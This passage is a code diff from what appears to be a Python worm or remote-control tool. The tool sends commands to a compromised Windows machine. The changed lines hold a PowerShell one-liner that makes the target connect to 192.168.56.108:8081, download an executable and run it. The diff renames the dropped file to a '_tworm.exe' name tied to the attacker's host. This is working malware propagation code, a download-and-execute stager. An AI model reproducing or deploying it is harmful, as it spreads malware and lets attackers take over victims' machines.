@@ -89,13 +89,13 @@ class tunnel(threading.Thread):
             self.sent_command(command,conn)
             print("run powershell")
             print("Target Response: {}".format(self.get_response(conn)))
-            command = '$client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8081); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("testhello.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();'.encode()
+            command = '$client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8081); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("{}_tworm.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();'.format(self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("target machine is starting to connect to the us")
             print("Target Response: {}".format(self.get_response(conn)))
             time.sleep(5)
-            command = "./testhello.exe".encode()
+            command = "./{}_tworm.exe".format(self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn)))
